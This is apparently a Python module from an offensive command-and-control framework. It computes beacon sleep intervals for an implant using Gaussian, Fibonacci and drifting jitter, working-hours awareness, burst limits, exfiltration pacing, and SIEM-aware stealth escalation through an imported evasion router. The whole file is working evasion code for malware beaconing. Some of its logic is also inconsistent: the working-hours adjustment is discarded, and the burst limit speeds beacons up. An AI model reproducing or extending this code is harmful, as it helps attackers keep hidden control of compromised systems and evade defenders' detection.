"""
Adaptive Timing for C2 / Beacon
Gaussian-jittered sleep with working-hours awareness, SIEM-aware routing,
and per-target statistical adaptation.

Built on top of evasion/adaptive_router.py for SIEM-aware posture,
this module focuses on timing generation and exfiltration pacing.
"""
from __future__ import annotations

import math
import random
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime, time as dtime
from enum import Enum


class TimingProfile(str, Enum):
    FIXED = "fixed"
    RANDOM = "random"
    GAUSSIAN = "gaussian"
    FIBONACCI = "fibonacci"
    ADAPTIVE = "adaptive"


@dataclass
class TimingConfig:
    profile: TimingProfile = TimingProfile.GAUSSIAN
    base_sleep_sec: float = 60.0
    jitter_percent: float = 30.0
    min_sleep_sec: float = 5.0
    max_sleep_sec: float = 600.0
    working_hours_start: Optional[str] = None
    working_hours_end: Optional[str] = None
    weekend_factor: float = 1.5
    burst_limit: int = 10
    burst_window_sec: float = 60.0
    siem_aware: bool = True
    stealth_level: str = "balanced"


class AdaptiveTiming:
    """
    Generate beacon sleep intervals with multiple jitter models,
    working-hours compression, burst mode, and optional SIEM-aware
    stealth escalation via evasion/adaptive_router.py.
    """

    def __init__(self, config: TimingConfig):
        self.config = config
        self._burst_count = 0
        self._burst_reset_ts = time.time()
        self._last_sleep = config.base_sleep_sec
        self._router = None
        if config.siem_aware:
            try:
                from evasion.adaptive_router import AdaptiveEvasionRouter
                self._router = AdaptiveEvasionRouter()
            except Exception:
                self._router = None

    def next_sleep(self) -> float:
        """Return next sleep duration in seconds."""
        cfg = self.config
        now = datetime.now()

        # Working hours compression
        sleep = self._apply_working_hours(cfg.base_sleep_sec, now)

        # Apply jitter model
        if cfg.profile == TimingProfile.FIXED:
            sleep = cfg.base_sleep_sec
        elif cfg.profile == TimingProfile.RANDOM:
            sleep = random.uniform(cfg.min_sleep_sec, cfg.max_sleep_sec)
        elif cfg.profile == TimingProfile.GAUSSIAN:
            mu = cfg.base_sleep_sec
            sigma = mu * (cfg.jitter_percent / 100.0)
            val = random.gauss(mu, max(sigma, 1.0))
            sleep = max(cfg.min_sleep_sec, min(cfg.max_sleep_sec, val))
        elif cfg.profile == TimingProfile.FIBONACCI:
            sleep = self._fibonacci_jitter(cfg.base_sleep_sec, cfg.jitter_percent)
        elif cfg.profile == TimingProfile.ADAPTIVE:
            sleep = self._adaptive_jitter(cfg.base_sleep_sec, cfg.jitter_percent)

        # SIEM-aware escalation
        if self._router is not None:
            try:
                level = self._router.determine_stealth_level()
                sleep = self._router.calculate_sleep_jitter(sleep, level)
            except Exception:
                pass

        # Burst limit
        if self._burst_count >= cfg.burst_limit:
            elapsed = time.time() - self._burst_reset_ts
            if elapsed < cfg.burst_window_sec:
                sleep = max(cfg.min_sleep_sec, sleep * 0.1)
            else:
                self._burst_count = 0
                self._burst_reset_ts = time.time()

        self._last_sleep = sleep
        return sleep

    def record_beacon(self) -> None:
        """Record a beacon attempt; updates burst counters."""
        now = time.time()
        if now - self._burst_reset_ts > self.config.burst_window_sec:
            self._burst_count = 0
            self._burst_reset_ts = now
        self._burst_count += 1

    def _apply_working_hours(self, base: float, now: datetime) -> float:
        cfg = self.config
        if not cfg.working_hours_start or not cfg.working_hours_end:
            return base
        try:
            start = datetime.strptime(cfg.working_hours_start, "%H:%M").time()
            end = datetime.strptime(cfg.working_hours_end, "%H:%M").time()
            current = now.time()
            in_window = start <= current <= end if start <= end else (current >= start or current <= end)
            if not in_window:
                return base * cfg.weekend_factor
        except Exception:
            pass
        return base

    def _fibonacci_jitter(self, base: float, jitter_percent: float) -> float:
        a, b = 0, 1
        for _ in range(random.randint(3, 8)):
            a, b = b, a + b
        factor = (a % 100) / 100.0
        spread = base * (jitter_percent / 100.0)
        return max(self.config.min_sleep_sec, min(self.config.max_sleep_sec, base + (factor - 0.5) * 2 * spread))

    def _adaptive_jitter(self, base: float, jitter_percent: float) -> float:
        drift = math.sin(time.time() / 3600.0) * 0.3
        noise = random.uniform(-1.0, 1.0) * (jitter_percent / 100.0)
        factor = 1.0 + drift + noise
        return max(self.config.min_sleep_sec, min(self.config.max_sleep_sec, base * factor))
